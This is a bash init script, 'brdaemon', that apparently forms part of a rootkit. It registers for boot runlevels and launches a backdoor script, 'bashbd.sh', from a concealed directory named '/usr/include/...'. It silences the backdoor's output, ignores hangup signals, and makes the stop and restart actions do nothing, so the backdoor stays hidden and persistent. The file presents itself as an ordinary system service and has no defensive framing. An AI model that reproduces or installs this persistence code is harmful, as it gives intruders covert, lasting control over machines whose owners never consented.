#!/bin/bash
### BEGIN INIT INFO
# Provides:          brdaemon
# Required-Start:
# Required-Stop:
# Default-Start:     2 3 4 5 
# Default-Stop:     
# Short-Description: Execute the brdaemon command.
# Description:
### END INIT INFO

BR_ROOTKIT_PATH="/usr/include/..."

function br_hookhup()
{
        :
}

function br_daemon()
{
	if ! type nohup >/dev/null; then
                nohup $BR_ROOTKIT_PATH/bashbd.sh > /dev/null 2>&1
                [ $? -eq 1 ] && exit
        else
                trap br_hookhup SIGHUP
                $BR_ROOTKIT_PATH/bashbd.sh > /dev/null 2>&1 &
                [ $? -eq 1 ] && exit
        fi
}

case "$1" in
        "start")
                br_daemon
                ;;
        "stop"|"restart"|"reload")
                ;;
        *)
                ;;
esac
